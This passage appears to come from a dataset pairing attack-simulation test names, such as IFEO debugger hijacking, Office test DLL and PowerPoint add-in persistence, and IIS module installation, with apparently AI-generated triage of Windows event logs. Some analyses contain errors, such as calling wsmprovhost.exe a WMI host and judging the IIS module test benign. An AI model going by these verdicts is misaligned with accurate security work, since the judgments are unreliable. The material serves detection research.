- The security logs show account logon and maintenance activities, including `EventID 4624` for a successful logon by the SYSTEM account and `EventID 4672` showing administrative privileges being assigned to the SYSTEM account. These actions, while potentially suspicious if unexpected, are typical during regular system operations or updates.

#### Windows PowerShell Log Analysis
- The PowerShell logs correspond with the Sysmon log, showing registry modifications using PowerShell scripts and pointing towards actions often linked with privilege escalation attempts through registry manipulation.

### Assessment
The logs contain a combination of benign and suspicious entries:
- **Benign Activity:** Routine log entries related to system and application processes, including service updates for Microsoft Edge, standard time synchronization actions, and SYSTEM account logon activities.
- **Suspicious Activity:** The use of PowerShell for modifying the registry to manipulate process behavior, particularly involving `whoami.exe`. The Sysmon logs showing registry modification attempts using PowerShell scripts are notably anomalous, especially given the context of altering Image File Execution Options and SilentProcessExit to execute `calc.exe`.

### Final Resolution
**Resolution: SUSPICIOUS**

### Recommendations
Given the suspicious nature of the PowerShell activity involving registry edits for process execution manipulation, further investigation is recommended:
1. **Investigate User Activity:** Review the actions of the user `SERVER002\\admin_test` to determine if these actions were authorized or part of expected tasks.
2. **Isolate and Analyze the Host:** Temporarily isolate the system for in-depth analysis to determine if unauthorized access has occurred and if any other malicious payloads have been executed.
3. **Audit PowerShell Scripts and Usage:** Conduct a thorough audit of recent PowerShell script execution to track any unauthorized scripts.
4. **Review Security Configurations:** Implement enhanced monitoring for future IFEO and similar registry modifications, and apply stricter execution policies for PowerShell and user scripts.
5. **Consider Resetting Key Credentials:** If any compromise is suspected, reset credentials for potentially impacted accounts and ensure all privileged access is accounted for."
Office Application Startup Test Persistence (HKCU),"Upon analyzing the provided Windows event logs from both the PowerShell and Sysmon logs, a few points arise that merit careful consideration regarding potential malicious activity:

### PowerShell Logs Analysis:

1. **Suspicious PowerShell Usage**: 
   - The repetitive PowerShell commands are attempting to create a registry key related to Microsoft Office add-ins or customization by adding a DLL located in a temporary path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\officetest_x64.dll` and `officetest_x86.dll`). This is atypical behavior because legitimate software installations usually do not involve PowerShell scripts adding registry keys for libraries in a temporary location.
   - Usage of `New-Object -COMObject ""Word.Application""` to determine whether Office is 32-bit or 64-bit adds a layer of sophistication indicating the script is tailored for the environment, which is common in malicious scripting trying to evade detection.
   - Execution of commands like `Stop-Process -Name ""WinWord""` and `Start-Process ""WinWord""` suggests process manipulation, which could potentially be a technique for injecting malicious DLLs into legitimate processes.

### Sysmon Logs Analysis:

1. **PowerShell and Other Process Executions**:
   - The execution of PowerShell and the subsequent chain of processes (`conhost.exe`, `wevtutil.exe`, `wermgr.exe` etc.) run by the user `SERVER002\\admin_test` indicate a sequence of activities that need closer examination.
   - The logs reveal multiple executions of `conhost.exe` originating from processes with a parent-child relationship pattern that can often be associated with command execution within a shell, potentially used for administrative scripting or to obfuscate malicious activity.
   
2. **Integrity Level Information**:
   - Processes like PowerShell and other system utilities are running with a ""High"" integrity level, indicating these have administrative privileges. This increases concerns over manipulation as the processes have the potential to perform system-wide changes.

### Assessment:

- **Indicators of Malicious Activity**:
  - The registry key manipulations via PowerShell, operation within temporary file locations, and process manipulations through command scripting demonstrate suspicious patterns which commonly align with techniques used in spear-phishing campaigns or lateral movement in an advanced persistent threat (APT) scenario.

- **Resolution**:
  - **SUSPICIOUS**: The logs exhibit evidence of behavior that is not typical for standard operations. The PowerShell scripts involving registry key modifications and involvement of multiple high-integrity processes suggest the need for further investigation. Key actions like registry monitoring for suspicious additions and effective logging on subsequent scripting activities would be advisable.
  
### Guidance:

1. **Immediate Steps**:
   - **Audit and Review**: Conduct an immediate review of recent changes to registry keys associated with Office add-ons and the temporary directories referenced in the logs.
   - **Isolation**: Consider isolating the affected host (Server002) to prevent potential lateral movement until further analysis clarifies the situation.

2. **Investigation**:
   - **Threat Hunting**: Initiate a threat hunt to correlate other similar events in the organization’s network, possibly indicating broader malicious activities.
   - **Analysis of Detected DLLs**: Examine the DLLs referenced in the scripts for any malicious signatures or known indicators of compromise.

3. **Defense Measures**:
   - **Increase Monitoring**: Enhance monitoring of PowerShell activity organization-wide with restrictive execution policies and logging enabled.
   - **User Awareness and Training**: Reinforce user awareness on opening email attachments or executing suspicious scripts that could be potential spear-phishing attempts.

Proceeding with these recommendations should aid in mitigating any potential threats while clarifying the nature and purpose of the observed activities."
Install IIS Module using AppCmd.exe,"Based on the analysis of the provided logs, let's summarize key points and identify any indicators of suspicious or malicious activity:

### Sysmon Logs Analysis:
1. **PowerShell Execution**: 
   - A PowerShell process (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) is logged running under the user `SERVER002\\admin_test`. PowerShell is often used for legitimate administrative tasks, but it is also a frequent tool for attackers. However, no specific indicators of malicious activity (e.g., suspicious command lines) are provided in the logs.

2. **Edge Update Activity**:
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` being executed, mostly under the `NT AUTHORITY\\SYSTEM` account. This activity aligns with routine software updates, which involves several process creations and registrations typical for legitimate update operations. The command-line arguments and image paths are standard for Microsoft Edge updates.

3. **CMD and WSM Provider Host**:
   - Instances of `cmd.exe` executing commands related to module installation (`appcmd.exe install module /name...`). This might be part of legitimate system configuration. The parent process is `wsmprovhost.exe`, which is commonly used by Windows Management Instrumentation (WMI), also indicative of legitimate system or administrative activity during configuration changes.

4. **Service and Process Executions**:
   - There are logs indicating service stops (`edgeupdate`), which can be benign as part of an update cycle.
   - `Hostname.exe` and `whoami.exe` execution under the `SERVER002\\admin_test` account could be part of routine checks for network configurations or testing.

5. **Network Service Executions**:
   - Process executions like `sppsvc.exe` (Software Protection Platform Service) and `WmiPrvSE.exe` (WMI Provider Host) running as `NT AUTHORITY\\NETWORK SERVICE`. These processes don't exhibit any explicit malicious indicators and appear to be normal operational activities.

### Conclusion:
- **No Direct Indicators of Malware**: The logs predominantly reflect benign system operations and maintenance tasks like software update checks and configurational commands. The processes and commands observed are typical for routine administrative and update activities with expected command-line arguments and image paths.
- **Activity Context**: While PowerShell execution is noted, no explicit red flags such as encoded scripts or suspicious command-line parameters suggest misuse.

### Resolution:
Given the lack of explicit indicators of compromise, the observed activities are deemed to be expected behavior for system updates and configurations.

**Final Assessment: BENIGN**

**Guidance**: 
- Monitor for recurring patterns or significant deviations from standard baselines in future logs. 
- Implement threat detection rules for specific PowerShell, CMD, or unauthorized service executions to promptly identify deviations potentially indicative of malicious activity."
Attaches Command Prompt as a Debugger to a List of Target Processes,"### Detailed Analysis of Logs:

#### Security Log Analysis:
1. **Event ID 4616**: This event indicates that the system time was changed. This can occur during normal operations, such as daylight saving time adjustments or synchronization with an NTP server. However, abrupt time changes without corresponding context can sometimes indicate tampering. In this scenario, the changes are closely timed, possibly indicating a clock synchronization event.
   
2. **Event ID 4624 and 4672**: These events show a successful logon (ID 4624) by the SYSTEM account and the assignment of special privileges (ID 4672). The privileges listed include critical operations like `SeDebugPrivilege` and `SeLoadDriverPrivilege`, typically associated with high-level system operations. While these privileges are common for SYSTEM-level accounts, their presence in unusual contexts could indicate potential misuse.

#### Application Log Analysis:
The logs primarily show multiple entries of Windows Defender being active and some Microsoft Edge Update logs. The Windows Defender logs indicate the product's active state, which is standard behavior. The edgeupdate service stopped events are typical following update executions unless they occur unexpectedly or in very frequent succession, which isn't clear from these logs alone.

#### Sysmon Log Analysis:
1. **Process Creation (Event ID 1 and 5)**: 
   - Multiple instances of processes like `wevtutil.exe`, `powershell.exe`, and `conhost.exe` from `admin_test` are observed. 
   - The use of `powershell.exe` with a command modifying the ""Image File Execution Options"" for accessibility executables (osk.exe, sethc.exe, etc.) to run `cmd.exe` is a known persistence technique typically associated with malware or unauthorized access. This modifies registry keys to trigger a command prompt when accessibility features are invoked at the login screen.
   - Multiple events involving `wevtutil.exe` for exporting logs, which can be suspicious if conducted by unauthorized users, indicating potential log tampering or clearing activities.

#### Windows PowerShell Log Analysis:
There is evidence of a PowerShell script being executed with the intent to set registry debugging options pointing to `cmd.exe`. This enhances the suspicion of unauthorized persistence mechanisms being set on the system.

#### System Log Analysis:
The logs show repeated minor time adjustments and synchronization events, likely part of normal NTP operations or system calibration.

### Assessment:
The confluence of PowerShell activities setting persistent access bypasses, elevated permissions log entries, and process executions like `wevtutil.exe` for log exporting strongly suggest attempts at unauthorized system modifications. The specific PowerShell activities are concerning as they directly modify system behavior on boot or user logon screens, a known tactic for maintaining illicit access.

### Resolution: MALICIOUS
The presence of a PowerShell script modifying Image File Execution Options is definitive evidence of malicious activity, typically leveraged for persistence on a Windows system. There should be a deeper investigation and immediate incident response, including:
- Examination of all systems for similar persistence mechanisms.
- Review and restoration of affected registry keys.
- Assessment for other indicators of compromise.
- Strengthening logging and monitoring to detect further unauthorized changes."
Azure AD - Create a new user,"Upon review of the provided Windows event logs, several activities stand out as suspicious or warrant further investigation:

1. **Frequent Edge Update Activities**:
   - There is a notable amount of activity related to `Microsoft Edge Update` processes, including multiple instances of process creation and termination within a very short window. While Edge updates can be automated and frequent, the number of instances and the volume of logging, particularly with the inclusion of temporary directories, could warrant additional scrutiny to confirm that these are legitimate updates and not an attempt to mask malicious activity.

2. **PowerShell Activity with Potential Malicious Intent**:
   - There are indications of a PowerShell script where the execution involves potentially suspicious command lines like creating new AzureAD users with specific credentials. This kind of action is uncommon in typical administrative tasks unless deliberately intended for user management by the IT department. Inclusion of hardcoded passwords or sensitive operations such as these should be treated with suspicion unless confirmed to be part of legitimate operations.

3. **Process Execution from Uncommon Directories**:
   - Execution of `powershell.exe` from a user's AppData Local Temp directory also hints at potentially unauthorized or suspicious script execution. This directory is often used for temporary operations and can be leveraged by attackers to execute payloads.

4. **Use of Privileged Tokens**:
   - Several logons and privileged operations were executed using system accounts (`NT AUTHORITY\\SYSTEM`). While some entries corresponding to software protection or system maintenance are expected, each occurrence should be verified to confirm intent. There are multiple events where high privileges like `SeDebugPrivilege` and others were assigned to processes, indicating potential elevation of privileges typically unnecessary for regular operations.

Given these points and considering the risks involved, my resolution of this situation would be:

- **SUSPICIOUS**: The logs contain activities that, while not definitively malicious, show abnormal patterns and actions that administrative staff should verify. It would be prudent to conduct a thorough investigation into these specific activities to rule out any malicious intent, ensure all executed scripts and updates are legitimate, and verify no unauthorized access or credential use occurred.

**Guidance on How to Proceed:**
1. **Review Edge Update Permissions**: Verify that all Edge update activities align with organizational policies for software updates.
2. **Evaluate PowerShell Execution Policies**: Ensure PowerShell executions are logged, script policies are enforced, and review recent script actions.
3. **Conduct a User and Privilege Audit**: Check the users and permissions granted, particularly focusing on the creation of new users and their purpose.
4. **Increase Monitoring and Scanning**: Utilize endpoint protection to scan for unusual or unauthorized processes.

By following these steps, you can ascertain the legitimacy of the actions, confirm whether these are part of authorized maintenance or updates, or if they indicate a potential breach requiring against further action."
Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),"The logs provided detail several activities that happened on the system, primarily involving process execution and the use of PowerShell. Let's break down the logs and identify any suspicious or anomalous behavior.

### Key Observations:

1. **Suspicious Powershell Activity:**
   - Several PowerShell commands are executed using the `powershell.exe` host under the user `SERVER002\admin_test`.
   - A PowerShell script attempts to copy a file `PptVBAaddin.ppam` from a temporary directory to a Microsoft Add-in directory. It also attempts to modify registry entries to auto-load this add-in within PowerPoint.
   - This behavior is suspicious and indicative of a potential attempt to persist a malicious add-in or macro into Microsoft PowerPoint.

2. **Error during PowerShell Execution:**
   - The PowerShell attempt failed, indicated by the error `""Could not find a part of the path 'C:\\Users\\admin_test\\AppData\\Roaming\\Microsoft\\Addins\\notepad.ppam'""`.
   - The failure of this operation might have prevented the intended malicious payload from being successfully installed, but it still indicates an attempt to perform a potentially harmful action.

3. **Repeated Process Executions:**
   - There are multiple executions of system utilities such as `powershell.exe`, `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. While these utilities are commonly used, they are often leveraged in post-exploitation activities to gather information or modify system settings.
   - The `wevtutil.exe` and `conhost.exe` processes are seen multiple times, possibly indicating an attempt to interact with event logs or console windows.

4. **Microsoft Edge Update Activity:**
   - There are numerous logs relating to `MicrosoftEdgeUpdate.exe`. This appears to be related to a standard software update operation.
   - No directly suspicious behavior is detected here; these logs reflect typical update processes carried out with `NT AUTHORITY\SYSTEM` level privileges.

### Assessment:

- **Malicious Activity:** The use of PowerShell to copy files into an `AddIns` directory and attempt registry modifications is highly indicative of an attempt to persist a malicious macro or add-in into Microsoft Office applications. This behavior aligns with tactics used in actual malware infections aiming to gain persistence on the system through malicious macros.
- **Failed Execution Reason:** While the execution failed due to path errors, the attempt itself is enough to classify the behavior as malicious.

### Resolution:

- **MALICIOUS:** The logs contain evidence of potentially malicious behavior, particularly aimed at using PowerShell for persisting a possible malicious add-in which did not fully succeed due to path errors. Immediate actions should be taken to verify the integrity of the system and to eliminate any potential threats.

### Guidance on How to Proceed:

1. **Immediate Isolation and Analysis:**
   - Isolate the host from the network to prevent further potential spread or communication with any external command and control servers.
   - Conduct a thorough scan using updated antivirus and endpoint detection solutions.

2. **Investigate User Activity:**
   - Investigate the `admin_test` user account to determine how this script was executed. Review login times, IP addresses used for access, and any other system interactions.

3. **Log and System Review:**
   - Review event logs around the same timeframe for other potential indicators of compromise.
   - Examine additional associated files, especially any new or suspicious add-ins or macros within Microsoft Office applications.

4. **Remediation:**
   - Clean any malicious registry changes and remove unauthorized files.
   - Consider strengthening PowerShell logging and endpoint protections to prevent similar future incidents.

5. **Updates and Patching:**
   - Ensure that all software, especially Microsoft Office and Windows OS, is kept up to date with the latest security patches. 

Taking these steps will aid in remediating the threat and establishing a plan to mitigate similar risks moving forward."
Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,"Based on the analysis of the provided log entries, several important observations and considerations arise that pertain to the security of the Windows host in question, ""Server002"". Below is a detailed analysis of the logs:

1. **Windows PowerShell Logs:**
   - Repeated executions of PowerShell with a command involving `New-WebGlobalModule` to register a module using `%windir%\system32\inetsrv\defdoc.dll` were observed. This is peculiar as manipulating IIS modules programmatically using PowerShell without a clear administrative purpose can be indicative of a compromise or misconfiguration if not properly justified.

2. **Sysmon Logs:**
   - Multiple instances of PowerShell and related processes (such as `conhost.exe` and `whoami.exe`) were executed by the user `SERVER002\admin_test` with a high integrity level, which could potentially indicate suspicious behavior if these actions were unexpected or unauthorized.
   - The execution of `wevtutil.exe`, a utility for managing Windows event logs, by `admin_test` could suggest suspicious manipulation of event logs, as attackers often clear logs to cover their tracks.
   - The presence of command execution involving various updates to Microsoft Edge by `NT AUTHORITY\SYSTEM` appears normal for system updates, though it is slightly excessive but can be accounted for if edge updates were explicitly scheduled.

3. **Application Logs:**
   - No direct signs of malicious activity were found in the application logs. The log entries primarily consist of regular service operations.

4. **Security Logs:**
   - There is an absence of security events, which might be unusual given the observed activities. It could indicate that security logging is disabled or logs were tampered with, both of which are red flags in incident detection and response.

5. **Contextual Analysis:**
   - The execution of the IIS module registration (`New-WebGlobalModule`) warrants further attention as it could be used to enable malicious module execution if not part of standard operations.
   - The repeated use of PowerShell and log manipulation tools by `admin_test` can be suspicious if not linked to legitimate administrative tasks or if this level of activity is anomalous compared to usual behavior.

**Final Assessment:**
Given the unusual use of PowerShell to register a web module combined with `wevtutil.exe` executions, there are reasonable grounds to suspect potentially unauthorized or stealthy activities may be present that expand beyond typical system administrative duties.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- **Further Investigation:** Conduct a thorough investigation to verify if the PowerShell script and module execution was authorized or necessary. Identify the intent and origin of these commands.
- **Access Logs:** Review and increase vigilance on access logs and previous activities of `SERVER002\admin_test` to establish a behavioral baseline.
- **Audit Security Settings:** Ensure that the security auditing is properly enabled and investigate why certain standard security logs might be missing.
- **Enhanced Monitoring:** Enable more comprehensive logging for PowerShell activities and consider deploying advanced threat detection solutions that can flag and alert on anomalies in script execution and module registrations.
- **Consult with Responsible Personnel:** Engage relevant IT staff to verify if they initiated these actions for valid administrative reasons."
